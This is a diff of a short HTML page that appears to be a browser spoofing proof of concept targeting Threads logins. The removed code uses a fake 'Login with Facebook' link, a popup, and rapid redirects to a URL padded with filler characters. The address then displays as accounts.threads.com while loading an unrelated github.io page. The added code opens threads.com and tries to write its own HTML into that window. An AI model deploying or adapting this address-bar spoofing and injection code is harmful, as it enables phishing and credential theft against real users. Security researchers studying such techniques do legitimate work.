@@ -1,22 +1,39 @@
+
+<!DOCTYPE html>
 <html>
-	<head>
-		<script>
-			function next() {
-				w.location.replace('https://accounts.threads.com%20%ㅤㅤㅤㅤ%20ㅤㅤㅤㅤ__________________________________________________________________@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@xnxrx.github.io/xnurx/threads.html/?'+n);
-				n++;
+<body>
+<script>
+const w = open("https://www.threads.com");
 
-				setTimeout("next();",15);
-				setTimeout("next();",25);
-			}
+if (w) {
+  const observer = new MutationObserver(() => {
+    console.log("DOM changed");
+  });
 
-			function f() {
-				w = window.open("content.html", "_blank", "width=500 height=500");
-				i = setInterval("try { x = w.location.href; } catch(e) { clearInterval(i); n = 0; next(); }", 5);
-			}
-		</script>
-	</head>
+  const timer = setInterval(() => {
+    if (!w || w.closed) {
+      clearInterval(timer);
+      observer.disconnect();
+      return;
+    }
 
-	<body>
-		<a href="#" onclick="f()">Login with Facebook</a>
-	</body>
+    try {
+      if (w.document.body) {
+        observer.observe(w.document.body, {
+          childList: true,
+          subtree: true
+        });
+
+        w.document.body.innerHTML =
+          "<h1>https://www.threads.com</h1>";
+
+        clearInterval(timer);
+      }
+    } catch(e) {
+      console.log("https://www.threads.com");
+    }
+  }, 1000);
+}
+</script>
+</body>
 </html>
